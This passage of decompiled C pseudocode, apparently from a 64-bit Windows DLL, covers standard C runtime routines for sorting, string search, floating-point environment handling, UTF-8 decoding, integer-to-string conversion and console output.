    "          while ( (unsigned __int64)v31 > v6 && !a4((unsigned __int64)v31, v17) );",
    "LABEL_54:",
    "          v8 = v36;",
    "          if ( (__int64)&v31[-v6] >= (__int64)&v7[-v29] )",
    "            break;",
    "          if ( v29 < (unsigned __int64)v7 )",
    "          {",
    "            v37[v36] = v29;",
    "            v37[v36 + 62] = v7;",
    "            v8 = ++v36;",
    "          }",
    "          if ( v6 >= (unsigned __int64)v31 )",
    "          {",
    "LABEL_19:",
    "            v36 = --v8;",
    "            if ( v8 < 0 )",
    "              return;",
    "            v6 = v37[v8];",
    "            v7 = (_BYTE *)v37[v8 + 62];",
    "          }",
    "          else",
    "          {",
    "            v7 = v31;",
    "          }",
    "        }",
    "        if ( v6 < (unsigned __int64)v31 )",
    "        {",
    "          v37[v36] = v6;",
    "          v37[v36 + 62] = v31;",
    "          v8 = ++v36;",
    "        }",
    "        if ( v29 >= (unsigned __int64)v7 )",
    "          goto LABEL_19;",
    "        v6 = v29;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180033FF0(_BYTE *a1, unsigned __int8 *a2)",
    "{",
    "  __int64 v2; // rax",
    "  unsigned __int8 *v3; // r9",
    "  bool v4; // cf",
    "  unsigned __int8 i; // al",
    "  _BYTE v8[32]; // [rsp+20h] [rbp-38h]",
    "",
    "  v2 = 0;",
    "  v3 = a2;",
    "  v4 = 1;",
    "  do",
    "  {",
    "    if ( !v4 )",
    "    {",
    "      sub_180012348();",
    "      JUMPOUT(0x18003408DLL);",
    "    }",
    "    v8[v2++] = 0;",
    "    v4 = (unsigned __int64)v2 < 0x20;",
    "  }",
    "  while ( v2 < 32 );",
    "  for ( i = *a2; i; i = *v3 )",
    "  {",
    "    ++v3;",
    "    v8[(unsigned __int64)i >> 3] |= 1 << (i & 7);",
    "  }",
    "  while ( 1 )",
    "  {",
    "    if ( !*a1 )",
    "      return 0;",
    "    if ( ((unsigned __int8)(1 << (*a1 & 7)) & v8[(unsigned __int64)(unsigned __int8)*a1 >> 3]) != 0 )",
    "      break;",
    "    ++a1;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "char *__fastcall sub_180034090(char *a1, unsigned __int8 *a2)",
    "{",
    "  __int64 v2; // r10",
    "  const __m128i *v3; // rdi",
    "  char *v5; // r8",
    "  __m128i v6; // xmm1",
    "  unsigned int v7; // eax",
    "  unsigned int v8; // edx",
    "  BOOL v9; // r11d",
    "  __m128i v10; // xmm2",
    "  unsigned int v11; // eax",
    "  unsigned int v13; // ecx",
    "  char v14; // al",
    "  __m128i v15; // xmm0",
    "  __m128i v16; // xmm0",
    "",
    "  v2 = (unsigned __int8)a2 & 0xF;",
    "  v3 = (const __m128i *)&a2[-v2];",
    "  v5 = a1;",
    "  v6 = _mm_loadu_si128((const __m128i *)&a2[-v2]);",
    "  switch ( (unsigned __int8)a2 & 0xF )",
    "  {",
    "    case 1:",
    "      v6 = _mm_srli_si128(v6, 1);",
    "      break;",
    "    case 2:",
    "      v6 = _mm_srli_si128(v6, 2);",
    "      break;",
    "    case 3:",
    "      v6 = _mm_srli_si128(v6, 3);",
    "      break;",
    "    case 4:",
    "      v6 = _mm_srli_si128(v6, 4);",
    "      break;",
    "    case 5:",
    "      v6 = _mm_srli_si128(v6, 5);",
    "      break;",
    "    case 6:",
    "      v6 = _mm_srli_si128(v6, 6);",
    "      break;",
    "    case 7:",
    "      v6 = _mm_srli_si128(v6, 7);",
    "      break;",
    "    case 8:",
    "      v6 = _mm_srli_si128(v6, 8);",
    "      break;",
    "    case 9:",
    "      v6 = _mm_srli_si128(v6, 9);",
    "      break;",
    "    case 0xA:",
    "      v6 = _mm_srli_si128(v6, 10);",
    "      break;",
    "    case 0xB:",
    "      v6 = _mm_srli_si128(v6, 11);",
    "      break;",
    "    case 0xC:",
    "      v6 = _mm_srli_si128(v6, 12);",
    "      break;",
    "    case 0xD:",
    "      v6 = _mm_srli_si128(v6, 13);",
    "      break;",
    "    case 0xE:",
    "      v6 = _mm_srli_si128(v6, 14);",
    "      break;",
    "    case 0xF:",
    "      v6 = _mm_srli_si128(v6, 15);",
    "      break;",
    "    default:",
    "      break;",
    "  }",
    "  v7 = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, v6));",
    "  if ( v7 )",
    "  {",
    "    _BitScanForward(&v8, v7);",
    "    if ( v2 )",
    "      v9 = v8 < (unsigned __int64)(16 - v2);",
    "    else",
    "      v9 = 1;",
    "    if ( 15 - v8 <= 0xF )",
    "    {",
    "      switch ( 15 - v8 )",
    "      {",
    "        case 0u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 1), 1);",
    "          break;",
    "        case 1u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 2), 2);",
    "          break;",
    "        case 2u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 3), 3);",
    "          break;",
    "        case 3u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 4), 4);",
    "          break;",
    "        case 4u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 5), 5);",
    "          break;",
    "        case 5u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 6), 6);",
    "          break;",
    "        case 6u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 7), 7);",
    "          break;",
    "        case 7u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 8), 8);",
    "          break;",
    "        case 8u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 9), 9);",
    "          break;",
    "        case 9u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 10), 10);",
    "          break;",
    "        case 0xAu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 11), 11);",
    "          break;",
    "        case 0xBu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 12), 12);",
    "          break;",
    "        case 0xCu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 13), 13);",
    "          break;",
    "        case 0xDu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 14), 14);",
    "          break;",
    "        case 0xEu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 15), 15);",
    "          break;",
    "        case 0xFu:",
    "          v6 = 0;",
    "          break;",
    "      }",
    "    }",
    "    if ( !v9 )",
    "      goto LABEL_40;",
    "  }",
    "  else",
    "  {",
    "    if ( ((unsigned __int8)a2 & 0xF) != 0 )",
    "    {",
    "LABEL_40:",
    "      v10 = _mm_loadu_si128(v3 + 1);",
    "      v11 = _mm_movemask_epi8(_mm_cmpeq_epi8(v10, (__m128i)0LL));",
    "      if ( !v11 )",
    "        return sub_180033FF0(v5, a2);",
    "      _BitScanForward(&v13, v11);",
    "      if ( (unsigned __int64)v13 - v2 < 0xFFFFFFFFFFFFFFF0uLL && v13 - v2 != 0 )",
    "        return sub_180033FF0(v5, a2);",
    "      switch ( 15 - v13 )",
    "      {",
    "        case 0u:",
    "          v10 = _mm_slli_si128(v10, 1);",
    "          break;",
    "        case 1u:",
    "          v10 = _mm_slli_si128(v10, 2);",
    "          break;",
    "        case 2u:",
    "          v10 = _mm_slli_si128(v10, 3);",
    "          break;",
    "        case 3u:",
    "          v10 = _mm_slli_si128(v10, 4);",
    "          break;",
    "        case 4u:",
    "          v10 = _mm_slli_si128(v10, 5);",
    "          break;",
    "        case 5u:",
    "          v10 = _mm_slli_si128(v10, 6);",
    "          break;",
    "        case 6u:",
    "          v10 = _mm_slli_si128(v10, 7);",
    "          break;",
    "        case 7u:",
    "          v10 = _mm_slli_si128(v10, 8);",
    "          break;",
    "        case 8u:",
    "          v10 = _mm_slli_si128(v10, 9);",
    "          break;",
    "        case 9u:",
    "          v10 = _mm_slli_si128(v10, 10);",
    "          break;",
    "        case 0xAu:",
    "          v10 = _mm_slli_si128(v10, 11);",
    "          break;",
    "        case 0xBu:",
    "          v10 = _mm_slli_si128(v10, 12);",
    "          break;",
    "        case 0xCu:",
    "          v10 = _mm_slli_si128(v10, 13);",
    "          break;",
    "        case 0xDu:",
    "          v10 = _mm_slli_si128(v10, 14);",
    "          break;",
    "        case 0xEu:",
    "          v10 = _mm_slli_si128(v10, 15);",
    "          break;",
    "        case 0xFu:",
    "          v10 = 0;",
    "          break;",
    "        default:",
    "          break;",
    "      }",
    "      v6 = _mm_or_si128(v6, v10);",
    "      goto LABEL_64;",
    "    }",
    "    if ( v3->m128i_i8[1] )",
    "      return sub_180033FF0(a1, a2);",
    "  }",
    "LABEL_64:",
    "  v14 = *v5;",
    "  if ( !*v5 )",
    "    return 0;",
    "  while ( 1 )",
    "  {",
    "    v15 = _mm_cvtsi32_si128(v14);",
    "    v16 = _mm_unpacklo_epi8(v15, v15);",
    "    if ( _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_shuffle_epi32(_mm_unpacklo_epi8(v16, v16), 0), v6)) )",
    "      break;",
    "    v14 = *++v5;",
    "    if ( !v14 )",
    "      return 0;",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180034458(__int64 a1, __int64 a2)",
    "{",
    "  return sub_180034460(a1, a2, 0);",
    "}",
    "",
    "",
    "unsigned __int8 *__fastcall sub_180034460(unsigned __int64 a1, unsigned __int64 a2, __int128 *a3)",
    "{",
    "  unsigned __int8 *v6; // rdx",
    "  __int64 v7; // [rsp+20h] [rbp-28h] BYREF",
    "  __int64 v8; // [rsp+30h] [rbp-18h]",
    "  char v9; // [rsp+38h] [rbp-10h]",
    "",
    "  if ( !a1 || !a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  if ( a1 >= a2 )",
    "    return 0;",
    "  sub_18001B674(&v7, a3);",
    "  v6 = (unsigned __int8 *)(a2 - 1);",
    "  if ( *(_DWORD *)(v8 + 8) )",
    "  {",
    "    do",
    "      --v6;",
    "    while ( a1 <= (unsigned __int64)v6 && (*(_BYTE *)(*v6 + v8 + 25) & 4) != 0 );",
    "    v6 = (unsigned __int8 *)(a2 - (((_BYTE)a2 - (_BYTE)v6) & 1) - 1);",
    "  }",
    "  if ( v9 )",
    "    *(_DWORD *)(v7 + 936) &= ~2u;",
    "  return v6;",
    "}",
    "",
    "",
    "_BOOL8 sub_1800344F4()",
    "{",
    "  return sub_18002D78C() == 0;",
    "}",
    "",
    "",
    "SIZE_T __fastcall sub_18003450C(const void *a1)",
    "{",
    "  if ( a1 )",
    "    return HeapSize(hHeap, 0, a1);",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return -1;",
    "}",
    "",
    "",
    "__int64 sub_180034548()",
    "{",
    "  return (unsigned int)dword_18004DE18;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180034550(_DWORD *a1, unsigned int a2, int a3)",
    "{",
    "  unsigned int v3; // r8d",
    "",
    "  v3 = a3 & 0xFFF7FFFF;",
    "  if ( (v3 & a2 & 0xFCF0FCE0) != 0 )",
    "  {",
    "    if ( a1 )",
    "      *a1 = sub_180035694(0, 0);",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 )",
    "      *a1 = sub_180035694(a2, v3);",
    "    else",
    "      sub_180035694(a2, v3);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl fegetenv(fenv_t *Env)",
    "{",
    "  Env->_Fe_ctl = sub_1800326F8();",
    "  Env->_Fe_stat = sub_1800327DC();",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800345D4(unsigned int *a1)",
    "{",
    "  unsigned int v2; // edi",
    "  fenv_t Env; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  sub_180032834(*a1);",
    "  sub_18003296C(a1[1]);",
    "  v2 = 0;",
    "  Env = 0;",
    "  if ( fegetenv(&Env) || *a1 != Env._Fe_ctl )",
    "    return 1;",
    "  LOBYTE(v2) = a1[1] != Env._Fe_stat;",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003462C(fenv_t *a1)",
    "{",
    "  fenv_t v2; // rax",
    "  fenv_t Env; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  Env._Fe_ctl = 0;",
    "  Env._Fe_stat = 0;",
    "  if ( fegetenv(&Env) )",
    "    return 1;",
    "  v2 = Env;",
    "  Env._Fe_ctl |= 0x1Fu;",
    "  *a1 = v2;",
    "  if ( (unsigned int)sub_1800345D4((unsigned int *)&Env) )",
    "    return 1;",
    "  sub_180035628();",
    "  return 0;",
    "}",
    "",
    "",
    "double __fastcall sub_18003467C(double result)",
    "{",
    "  double v1; // rdx",
    "  unsigned __int64 v2; // rax",
    "  _BOOL8 v3; // r8",
    "  double v4; // rax",
    "",
    "  v1 = result;",
    "  v2 = *(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFLL;",
    "  v3 = *(_QWORD *)&result != (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFLL);",
    "  if ( (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFuLL) < 0x4340000000000000LL )",
    "  {",
    "    if ( v2 >= 0x3FF0000000000000LL )",
    "    {",
    "      *(_QWORD *)&v4 = *(_QWORD *)&result & ~((1LL << (51 - (unsigned __int8)(*(_QWORD *)&result >> 52))) - 1);",
    "      result = v4;",
    "      if ( !v3 && *(_QWORD *)&v4 != *(_QWORD *)&v1 )",
    "        return v4 + 1.0;",
    "    }",
    "    else if ( v2 )",
    "    {",
    "      if ( *(_QWORD *)&result == (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFLL) )",
    "        return 1.0;",
    "      else",
    "        return -0.0;",
    "    }",
    "  }",
    "  else if ( v2 > 0x7FF0000000000000LL )",
    "  {",
    "    JUMPOUT(0x180035B84LL);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_180034740(__int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 result; // rax",
    "  __m128i v4; // xmm3",
    "  double v5; // xmm6_8",
    "  __m128i v6; // xmm2",
    "  __m128i v7; // xmm2",
    "",
    "  if ( !dword_18004DE38 )",
    "  {",
    "    result = _XMM0.m128i_i64[0];",
    "    v4 = _mm_sub_epi64(_mm_srli_epi64(_XMM0, 0x34u), (__m128i)xmmword_180042CA0);",
    "    if ( COERCE_DOUBLE(_XMM0.m128i_i64[0] & 0x7FF0000000000000LL) == INFINITY )",
    "    {",
    "      if ( _XMM0.m128i_i64[0] == 0x7FF0000000000000LL )",
    "        return result;",
    "      if ( _XMM0.m128i_i64[0] != 0xFFF0000000000000uLL )",
    "        return _XMM0.m128i_i64[0] | 0x8000000000000LL;",
    "    }",
    "    else",
    "    {",
    "      *(_QWORD *)&v5 = *(_OWORD *)&_mm_cvtepi32_pd(v4);",
    "      if ( *(double *)_XMM0.m128i_i64 > 0.0 )",
    "      {",
    "        v6 = _mm_and_si128(_XMM0, (__m128i)xmmword_180042CC0);",
    "        if ( v5 == -1023.0 )",
    "        {",
    "          v7 = _mm_or_si128(v6, (__m128i)xmmword_180042D50);",
    "          *(double *)v7.m128i_i64 = *(double *)v7.m128i_i64 - 1.0;",
    "          result = _mm_and_si128(v7, (__m128i)xmmword_180042CC0).m128i_u64[0];",
    "        }",
    "        result = 2 * (result & 0x80000000000LL) + (result & 0xFF00000000000LL);",
    "        if ( fabs(*(double *)_XMM0.m128i_i64 - 1.0) >= 0.0625 )",
    "          result >>= 44;",
    "        return result;",
    "      }",
    "      if ( *(double *)_XMM0.m128i_i64 == 0.0 )",
    "        return sub_180035C10(a1, a2, 1);",
    "    }",
    "    return sub_180035C10(a1, a2, 2);",
    "  }",
    "  __asm",
    "  {",
    "    vpsrlq  xmm3, xmm0, 34h ; '4'",
    "    vmovq   rax, xmm0",
    "    vpsubq  xmm3, xmm3, cs:xmmword_180042CA0",
    "    vcvtdq2pd xmm6, xmm3",
    "    vpand   xmm5, xmm0, cs:xmmword_180042C70",
    "    vcomisd xmm5, qword ptr cs:xmmword_180042C70",
    "  }",
    "  if ( result != 0x7FF0000000000000LL )",
    "  {",
    "    if ( result == 0xFFF0000000000000uLL )",
    "    {",
    "      __asm { vmovsd  xmm1, cs:qword_180042C80 }",
    "      result = sub_180035C10(a1, a2, 2);",
    "      __asm { vmovdqa xmm6, [rsp+58h+var_38] }",
    "      return result;",
    "    }",
    "    result = sub_180035C10(a1, a2, 3);",
    "  }",
    "  __asm { vmovdqa xmm6, [rsp+58h+var_38] }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180034D08(__int64 a1, char *a2, unsigned __int64 a3, unsigned __int8 *a4, __int64 a5)",
    "{",
    "  unsigned __int8 *v5; // r10",
    "  __int64 v6; // r11",
    "  char *v7; // rdi",
    "  unsigned __int64 v9; // r15",
    "  _DWORD *v10; // r14",
    "  int v12; // r9d",
    "  unsigned __int8 v13; // r8",
    "  unsigned __int8 v14; // bl",
    "  unsigned int v15; // edx",
    "  unsigned __int64 v16; // r9",
    "  char v17; // cl",
    "  _DWORD v18[6]; // [rsp+18h] [rbp-60h]",
    "",
    "  v5 = (unsigned __int8 *)&unk_18004DE20;",
    "  v6 = 0;",
    "  v7 = (char *)&unk_18004477D;",
    "  if ( a4 )",
    "    v5 = a4;",
    "  if ( a2 )",
    "    v7 = a2;",
    "  v9 = 1;",
    "  if ( a2 )",
    "    v9 = a3;",
    "  v10 = (_DWORD *)(a1 & -(__int64)(a2 != 0));",
    "  if ( !v9 )",
    "    return -2;",
    "  if ( !*((_WORD *)v5 + 3) )",
    "  {",
    "    v12 = (unsigned __int8)*v7++;",
    "    if ( (v12 & 0x80u) == 0 )",
    "    {",
    "      if ( v10 )",
    "        *v10 = v12;",
    "      LOBYTE(v6) = (_BYTE)v12 != 0;",
    "      return v6;",
    "    }",
    "    if ( (v12 & 0xE0) == 0xC0 )",
    "    {",
    "      v13 = 2;",
    "LABEL_20:",
    "      v14 = v13;",
    "      v15 = v12 & ((1 << (7 - v13)) - 1);",
    "      goto LABEL_24;",
    "    }",
    "    if ( (v12 & 0xF0) == 0xE0 )",
    "    {",
    "      v13 = 3;",
    "      goto LABEL_20;",
    "    }",
    "    if ( (v12 & 0xF8) == 0xF0 )",
    "    {",
    "      v13 = 4;",
    "      goto LABEL_20;",
    "    }",
    "    return sub_180034CF4(v5, a5);",
    "  }",
    "  v13 = v5[4];",
    "  v15 = *(_DWORD *)v5;",
    "  v14 = v5[6];",
    "  if ( (unsigned __int8)(v13 - 2) > 2u || !v14 || v14 >= v13 )",
    "    return sub_180034CF4(v5, a5);",
    "LABEL_24:",
    "  v16 = v14;",
    "  if ( v14 >= v9 )",
    "    v16 = v9;",
    "  while ( v7 - a2 < v16 )",
    "  {",
    "    v17 = *v7++;",
    "    if ( (v17 & 0xC0) != 0x80 )",
    "      return sub_180034CF4(v5, a5);",
    "    v15 = (v15 << 6) | v17 & 0x3F;",
    "  }",
    "  if ( v16 < v14 )",
    "  {",
    "    *((_WORD *)v5 + 2) = v13;",
    "    *((_WORD *)v5 + 3) = (unsigned __int8)(v14 - v16);",
    "    *(_DWORD *)v5 = v15;",
    "    return -2;",
    "  }",
    "  if ( v15 - 55296 <= 0x7FF )",
    "    return sub_180034CF4(v5, a5);",
    "  if ( v15 >= 0x110000 )",
    "    return sub_180034CF4(v5, a5);",
    "  v18[2] = 128;",
    "  v18[3] = 2048;",
    "  v18[4] = 0x10000;",
    "  if ( v15 < v18[v13] )",
    "    return sub_180034CF4(v5, a5);",
    "  if ( v10 )",
    "    *v10 = v15;",
    "  return sub_180034CEC(v14 & (unsigned __int64)-(__int64)(v15 != 0), v5);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180034EE4(unsigned int a1, __int16 *a2, unsigned __int64 a3, unsigned int a4, char a5)",
    "{",
    "  unsigned int v8; // r10d",
    "  __int16 *v9; // r11",
    "  unsigned __int64 v10; // rdi",
    "  __int16 *v11; // r8",
    "  __int16 *v12; // r9",
    "  unsigned int v13; // ecx",
    "  _WORD *v14; // rdx",
    "  __int16 v15; // ax",
    "  __int16 v17; // cx",
    "",
    "  v8 = a1;",
    "  v9 = a2;",
    "  v10 = 0;",
    "  if ( a5 )",
    "  {",
    "    v8 = -a1;",
    "    *a2 = 45;",
    "    v10 = 1;",
    "    v9 = a2 + 1;",
    "  }",
    "  v11 = v9;",
    "  do",
    "  {",
    "    v12 = v9;",
    "    v13 = v8 % a4;",
    "    v14 = v9 + 1;",
    "    v8 /= a4;",
    "    v15 = 87;",
    "    if ( v13 <= 9 )",
    "      v15 = 48;",
    "    ++v10;",
    "    *v9 = v13 + v15;",
    "    if ( !v8 )",
    "      break;",
    "    ++v9;",
    "  }",
    "  while ( v10 < a3 );",
    "  if ( v10 < a3 )",
    "  {",
    "    *v14 = 0;",
    "    do",
    "    {",
    "      v17 = *v12;",
    "      *v12-- = *v11;",
    "      *v11++ = v17;",
    "    }",
    "    while ( v11 < v12 );",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *a2 = 0;",
    "    *(_DWORD *)sub_18001A80C() = 34;",
    "    invalid_parameter_noinfo();",
    "    return 34;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180034FC8(",
    "        unsigned int a1,",
    "        __int16 *a2,",
    "        unsigned __int64 a3,",
    "        unsigned int a4,",
    "        unsigned __int8 a5)",
    "{",
    "  _DWORD *v5; // rax",
    "  unsigned int v6; // ebx",
    "",
    "  if ( !a2 || !a3 )",
    "    goto LABEL_2;",
    "  *a2 = 0;",
    "  if ( a3 <= (unsigned __int64)a5 + 1 )",
    "  {",
    "    v5 = sub_18001A80C();",
    "    v6 = 34;",
    "    goto LABEL_3;",
    "  }",
    "  if ( a4 - 2 > 0x22 )",
    "  {",
    "LABEL_2:",
    "    v5 = sub_18001A80C();",
    "    v6 = 22;",
    "LABEL_3:",
    "    *v5 = v6;",
    "    invalid_parameter_noinfo();",
    "    return v6;",
    "  }",
    "  return sub_180034EE4(a1, a2, a3, a4, a5);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035034(signed int a1, __int16 *a2, unsigned __int64 a3, unsigned int a4)",
    "{",
    "  unsigned __int8 v4; // al",
    "",
    "  v4 = 0;",
    "  if ( a4 == 10 )",
    "    v4 = a1 < 0;",
    "  return sub_180034FC8(a1, a2, a3, a4, v4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035054(char *a1, char *a2)",
    "{",
    "  int v2; // eax",
    "  unsigned int v3; // r8d",
    "  signed __int64 v4; // rcx",
    "",
    "  v2 = *(unsigned __int16 *)a2;",
    "  v3 = *(unsigned __int16 *)a1 - v2;",
    "  if ( !v3 )",
    "  {",
    "    v4 = a1 - a2;",
    "    do",
    "    {",
    "      if ( !(_WORD)v2 )",
    "        break;",
    "      a2 += 2;",
    "      v2 = *(unsigned __int16 *)a2;",
    "      v3 = *(unsigned __int16 *)&a2[v4] - v2;",
    "    }",
    "    while ( !v3 );",
    "  }",
    "  return ((int)v3 > 0) - (v3 >> 31);",
    "}",
    "",
    "",
    "__int64 sub_18003508C()",
    "{",
    "  char *FileW; // rax",
    "  unsigned int v1; // ebx",
    "",
    "  FileW = (char *)hConsoleOutput;",
    "  v1 = 0;",
    "  if ( hConsoleOutput == (HANDLE)-2LL )",
    "  {",
    "    FileW = (char *)CreateFileW((LPCWSTR)L\"CONOUT$\", 0x40000000u, 3u, 0, 3u, 0, 0);",
    "    hConsoleOutput = FileW;",
    "  }",
    "  LOBYTE(v1) = FileW + 1 != 0;",
    "  return v1;",
    "}",
    "",
    "",
    "BOOL sub_1800350E0()",
    "{",
    "  BOOL result; // eax",
    "",
    "  if ( (unsigned __int64)hConsoleOutput <= 0xFFFFFFFFFFFFFFFDuLL )",
    "    return CloseHandle(hConsoleOutput);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800350FC(void *lpBuffer, PCONTEXT nNumberOfCharsToWrite, DWORD *lpNumberOfCharsWritten)",
    "{",
    "  DWORD v4; // esi",
    "  unsigned int v6; // ebx",
    "",
    "  v4 = (unsigned int)nNumberOfCharsToWrite;",
    "  v6 = WriteConsoleW(hConsoleOutput, lpBuffer, (DWORD)nNumberOfCharsToWrite, lpNumberOfCharsWritten, 0);",
    "  if ( !v6 && GetLastError() == 6 )",
    "  {",
    "    if ( (unsigned __int64)hConsoleOutput <= 0xFFFFFFFFFFFFFFFDuLL )",
    "      CloseHandle(hConsoleOutput);",
    "    hConsoleOutput = CreateFileW((LPCWSTR)L\"CONOUT$\", 0x40000000u, 3u, 0, 3u, 0, 0);",
    "    return WriteConsoleW(hConsoleOutput, lpBuffer, v4, lpNumberOfCharsWritten, 0);",
    "  }",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800351BC(_BYTE *a1, unsigned __int16 a2, _QWORD *a3, __int64 a4)",
    "{",
    "  _QWORD *v4; // rbx",
    "  unsigned __int16 v5; // ax",
    "  __int64 v7; // rax",
    "  __int64 v8; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v4 = &unk_18004DE28;",
    "  if ( a3 )",
    "    v4 = a3;",
    "  v5 = a2 + 9216;",
    "  if ( *(_DWORD *)v4 )",
    "  {",
    "    if ( v5 > 0x3FFu )",
    "      return sub_180034CF4(v4, a4);",
    "    v8 = 0;",
    "    v7 = sub_18002FE1C(a1, *(_DWORD *)v4 + (a2 & 0x23FFu), &v8);",
    "    return sub_180034CEC(v7, v4);",
    "  }",
    "  else",
    "  {",
    "    if ( v5 <= 0x3FFu )",
    "      return sub_180034CF4(v4, a4);",
    "    if ( (unsigned __int16)(a2 + 10240) > 0x3FFu )",
    "    {",
    "      return sub_18002FE1C(a1, a2, v4);",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)v4 = ((a2 << 10) & 0xFC9FFC00) + 0x10000;",
    "      return 0;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035260(_DWORD *a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    *a1 = dword_18004DE3C;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035290(int a1, int a2)",
    "{",
    "  __int64 v3; // r9",
    "  __int64 v4; // rax",
    "  __int64 v5; // rdx",
    "  char v6; // cl",
    "  char v7; // r11",
    "  __int64 result; // rax",
    "",
    "  v3 = (__int64)a1 >> 6;",
    "  v4 = a1 & 0x3F;",
    "  v5 = qword_18004D870[v3];",
    "  v6 = *(_BYTE *)(v5 + 72 * v4 + 56);",
    "  v7 = *(_BYTE *)(v5 + 72 * v4 + 57);",
    "  if ( a2 == 0x4000 )",
    "  {",
    "    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;",
    "    *(_BYTE *)(qword_18004D870[v3] + 72 * v4 + 57) = 0;",
    "  }",
    "  else if ( a2 == 0x8000 )",
    "  {",
    "    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 & 0x7F;",
    "  }",
    "  else if ( ((a2 - 0x10000) & 0xFFFEFFFF) != 0 )",
    "  {",
    "    if ( a2 == 0x40000 )",
    "    {",
    "      *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;",
    "      *(_BYTE *)(qword_18004D870[v3] + 72 * v4 + 57) = 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(v5 + 72 * v4 + 56) = v6 | 0x80;",
    "    *(_BYTE *)(qword_18004D870[v3] + 72 * v4 + 57) = 2;",
    "  }",
    "  if ( (v6 & 0x80) == 0 )",
    "    return 0x8000;",
    "  if ( !v7 )",
    "    return 0x4000;",
    "  result = 0x10000;",
    "  if ( v7 == 1 )",
    "    return 0x40000;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035374(__int64 a1, __int64 a2)",
    "{",
    "  unsigned int v2; // edi",
    "  int v3; // ebx",
    "  int v4; // ebx",
    "  _QWORD v6[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v7; // [rsp+30h] [rbp-30h]",
    "  __int128 v8; // [rsp+38h] [rbp-28h]",
    "  char v9; // [rsp+48h] [rbp-18h]",
    "  int v10; // [rsp+4Ch] [rbp-14h]",
    "  char v11; // [rsp+50h] [rbp-10h]",
    "  int v12; // [rsp+54h] [rbp-Ch]",
    "  char v13; // [rsp+58h] [rbp-8h]",
    "",
    "  v6[0] = 0;",
    "  v7 = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v9 = 1;",
    "    v8 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v2 = sub_18003540C(a1, a2, v6);",
    "  if ( v9 == 2 )",
    "    *(_DWORD *)(v6[0] + 936LL) &= ~2u;",
    "  if ( v11 )",
    "  {",
    "    v3 = v10;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 32) = v3;",
    "  }",
    "  if ( v13 )",
    "  {",
    "    v4 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 36) = v4;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003540C(unsigned int a1, LARGE_INTEGER a2, __int64 a3)",
    "{",
    "  LARGE_INTEGER v6; // r12",
    "  LARGE_INTEGER v7; // rax",
    "  __int64 v8; // rbp",
